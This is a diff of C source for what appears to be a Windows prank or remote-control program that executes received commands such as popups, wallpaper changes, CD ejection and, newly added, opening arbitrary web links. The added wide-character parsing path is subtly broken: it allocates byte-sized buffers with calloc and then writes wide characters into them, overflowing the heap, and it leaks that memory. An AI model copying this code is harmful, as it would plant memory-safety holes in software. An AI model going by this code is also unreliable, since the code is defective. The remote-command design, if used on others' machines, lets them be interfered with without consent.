@@ -45,12 +45,32 @@ static char wallpaper[MAX_PATH] = BADPATH;
 
 void popupW(char *argz) {
     wchar_t wargz[CMD_ARGSZ];
-
+    wchar_t *ptr;
     MultiByteToWideChar(CP_UTF8, 0, argz, -1, wargz, CMD_ARGSZ); // turn argz to wchar and put it in wargz
     
+#ifndef TELTHAR_STUPID_WIDE_CHAR
     wchar_t *arg1 = wcstok(wargz, SEPL);
     wchar_t *arg2 = wcstok(NULL, SEPL);
+#else
+    /* For later generations */
     
+    //wchar_t *arg1 = _wcstok_s_l(wargz, SEPL, &ptr, TELTHAR_STUPID_WIDE_CHAR);
+    //wchar_t *arg2 = _wcstok_s_l(NULL, SEPL, &ptr, TELTHAR_STUPID_WIDE_CHAR);
+
+    unsigned char *_arg1 = _mbstok(argz, SEPC);
+    unsigned char *_arg2 = _mbstok(NULL, SEPC);
+
+    wchar_t *arg1, *arg2;
+    int one = mbstrlen(_arg1);
+    int two = mbstrlen(_arg2);
+
+    arg1 = calloc(one, 1);
+    arg2 = calloc(two, 1);
+
+    MultiByteToWideChar(CP_UTF8, 0, _arg1, -1, arg1, one);
+    MultiByteToWideChar(CP_UTF8, 0, _arg2, -1, arg2, two);
+#endif
+
     if(!arg1) {
         JBlog("Not enough arguments");
         return;
@@ -124,7 +144,6 @@ void execCommand(JBCMD cmd)
             JBlogErr("No saved wallpaper");
             break;
         }
-        
         changeWallpaper(wallpaper);
         break;
 
@@ -138,7 +157,7 @@ void execCommand(JBCMD cmd)
 
     /* --- Other --- */
     case JB_OPENWEB:
-
+        openLink(cmd.args);
         break;
     case JB_CDEJECT:
 
